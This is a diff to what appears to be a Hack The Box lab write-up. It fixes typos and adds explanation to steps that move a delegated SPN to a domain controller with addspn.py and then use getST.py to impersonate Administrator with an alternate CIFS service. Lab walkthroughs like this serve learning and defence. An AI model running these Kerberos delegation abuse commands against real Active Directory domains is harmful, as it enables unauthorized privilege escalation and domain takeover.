@@ -38,6 +38,8 @@ distinguishedName: CN=EXCH01,CN=Computers,DC=pirate,DC=htb
 permission: WRITE
 ```
 
+Move the delegated SPN (http/WEB01) from WEB01 to DC01
+
 Remove the SPN from WEB01
 
 ```bash
@@ -60,7 +62,9 @@ garffff@garffff:~/htb/pirate$ python3 /opt/krbrelayx/addspn.py 192.168.100.1 -u 
 [+] SPN Modified successfully
 ```
 
-Obtain Service Ticket, importantateing Administrator usinf CIFS as an alt service
+Obtain Service Ticket, impersonating Administrator using CIFS as an alt service
+
+The -altservice flag is used to request a service ticket for CIFS/DC01 instead of HTTP, allowing SMB-based tools like psexec to work.
 
 ```bash
 garffff@garffff:~/htb/pirate$ getST.py -dc-ip 192.168.100.1 pirate.htb/a.white_adm:'Password123' -spn http/WEB01 -impersonate Administrator -altservice CIFS/DC01.pirate.htb
